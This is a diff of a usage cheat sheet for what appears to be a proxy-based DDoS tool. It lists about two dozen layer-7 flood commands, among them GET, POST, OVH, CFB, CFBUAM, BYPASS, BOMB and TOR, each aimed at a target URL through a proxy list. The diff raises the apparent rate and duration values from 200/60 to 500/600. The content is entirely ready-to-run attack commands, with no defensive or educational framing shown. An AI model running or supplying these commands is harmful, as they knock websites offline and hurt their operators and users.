@@ -14,57 +14,57 @@
  
 ### ddos-layer7（代理）代理文件位置/root/files/proxies/
 
-	python3 start.py GET url 0 1000 all.txt 200 60
+	python3 start.py GET url 0 1000 all.txt 500 600
  
-	python3 start.py POST url 0 1000 all.txt 200 60
+	python3 start.py POST url 0 1000 all.txt 500 600
  
-	python3 start.py OVH url 0 1000 all.txt 200 60
+	python3 start.py OVH url 0 1000 all.txt 500 600
  
-	python3 start.py RHEX url 0 1000 all.txt 200 60
+	python3 start.py RHEX url 0 1000 all.txt 500 600
  
-	python3 start.py STOMP url 0 1000 all.txt 200 60
+	python3 start.py STOMP url 0 1000 all.txt 500 600
  
-	python3 start.py STRESS url 0 1000 all.txt 200 60
+	python3 start.py STRESS url 0 1000 all.txt 500 600
  
-	python3 start.py DYN url 0 1000 all.txt 200 60
+	python3 start.py DYN url 0 1000 all.txt 500 600
  
-	python3 start.py DOWNLOADER url 0 1000 all.txt 200 60
+	python3 start.py DOWNLOADER url 0 1000 all.txt 500 600
  
-	python3 start.py SLOW url 0 1000 all.txt 200 60
+	python3 start.py SLOW url 0 1000 all.txt 500 600
  
-	python3 start.py HEAD url 0 1000 all.txt 200 60
+	python3 start.py HEAD url 0 1000 all.txt 500 600
  
-	python3 start.py NULL url 0 1000 all.txt 200 60
+	python3 start.py NULL url 0 1000 all.txt 500 600
  
-	python3 start.py COOKIE url 0 1000 all.txt 200 60
+	python3 start.py COOKIE url 0 1000 all.txt 500 600
  
-	python3 start.py PPS url 0 1000 all.txt 200 60
+	python3 start.py PPS url 0 1000 all.txt 500 600
  
-	python3 start.py EVEN url 0 1000 all.txt 200 60
+	python3 start.py EVEN url 0 1000 all.txt 500 600
  
-	python3 start.py GSB url 0 1000 all.txt 200 60
+	python3 start.py GSB url 0 1000 all.txt 500 600
  
-	python3 start.py DGB url 0 1000 all.txt 200 60
+	python3 start.py DGB url 0 1000 all.txt 500 600
  
-	python3 start.py AVB url 0 1000 all.txt 200 60
+	python3 start.py AVB url 0 1000 all.txt 500 600
  
-	python3 start.py BOT url 0 1000 all.txt 200 60
+	python3 start.py BOT url 0 1000 all.txt 500 600
  
-	python3 start.py APACHE url 0 1000 all.txt 200 60
+	python3 start.py APACHE url 0 1000 all.txt 500 600
  
-	python3 start.py XMLRPC url 0 1000 all.txt 200 60
+	python3 start.py XMLRPC url 0 1000 all.txt 500 600
  
-	python3 start.py CFB url 0 1000 all.txt 200 60
+	python3 start.py CFB url 0 1000 all.txt 500 600
  
-	python3 start.py CFBUAM url 0 1000 all.txt 200 60
+	python3 start.py CFBUAM url 0 1000 all.txt 500 600
  
-	python3 start.py BYPASS url 0 1000 all.txt 200 60
+	python3 start.py BYPASS url 0 1000 all.txt 500 600
  
-	python3 start.py BOMB url 5 1000 all.txt 200 60
+	python3 start.py BOMB url 5 1000 all.txt 500 600
  
-	python3 start.py KILLER url 0 1000 all.txt 200 60
+	python3 start.py KILLER url 0 1000 all.txt 500 600
  
-	python3 start.py TOR url 0 1000 all.txt 200 60
+	python3 start.py TOR url 0 1000 all.txt 500 600
  
 
 #### ddos-layer4（放大）反射文件位置/root/files
